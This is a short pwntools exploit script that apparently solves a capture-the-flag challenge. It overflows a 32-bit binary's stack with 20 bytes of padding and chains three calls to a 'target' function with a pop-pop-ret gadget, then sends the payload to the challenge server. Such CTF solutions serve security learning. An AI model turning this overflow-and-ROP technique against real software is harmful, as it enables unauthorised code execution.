#!/usr/bin/python3
from pwn import *

def build_payload():
    """Build the payload to send."""
    padding = b"A" * 20
    target_addr = p32(elf.sym.target)
    clean_stack_addr = p32(pop2ret)
    args_list = [p32(arg) for arg in [0x12345678, 0x87654321, 0x11223344, 0x44332211, 0x41414141, 0x42424242]]
    
    # Chain the calls to target with cleaning the stack in between
    payload = padding
    for i in range(0, len(args_list), 2):
        payload += target_addr + clean_stack_addr + args_list[i] + args_list[i+1]

    return payload

# Load the binary
elf = context.binary = ELF("chall")

# Establish the connection
connection = remote("ctf99.cs.ui.ac.id", 10016)

# The address of the gadget that performs two "pop" operations
pop2ret = 0x0804872A

# Construct and send the payload
payload = build_payload()
connection.sendline(payload)

# Begin interactive session
connection.interactive()
